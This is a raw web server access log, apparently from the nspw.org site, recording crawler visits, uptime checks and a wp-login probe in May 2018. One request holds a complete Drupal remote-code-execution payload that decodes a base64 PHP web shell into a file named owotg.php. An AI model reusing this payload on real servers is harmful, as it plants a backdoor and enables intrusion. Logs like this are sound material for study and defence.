37.173.15.225 - - [01/May/2018:17:15:06 -0400] "GET /wp-login.php HTTP/1.1" 404 8180 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
37.173.15.225 - - [01/May/2018:17:15:07 -0400] "GET / HTTP/1.1" 200 8298 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [01/May/2018:17:15:34 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
59.124.153.166 - - [01/May/2018:17:17:29 -0400] "GET /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 200 6213 "-" "curl/7.47.0"
66.249.73.87 - - [01/May/2018:17:17:47 -0400] "GET /papers/1999/nspw1999-henning.pdf HTTP/1.1" 304 3605 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
77.88.47.40 - - [01/May/2018:17:18:15 -0400] "GET /papers/2001/nspw2001-brostoff.pdf HTTP/1.1" 200 1048614 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [01/May/2018:17:19:27 -0400] "GET /2008/ HTTP/1.1" 200 5567 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
69.162.124.227 - - [01/May/2018:17:20:34 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
79.117.206.209 - - [01/May/2018:17:25:18 -0400] "GET / HTTP/1.0" 400 0 "-" "-"
69.162.124.227 - - [01/May/2018:17:25:34 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.87 - - [01/May/2018:17:26:10 -0400] "GET /2017 HTTP/1.1" 200 7054 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
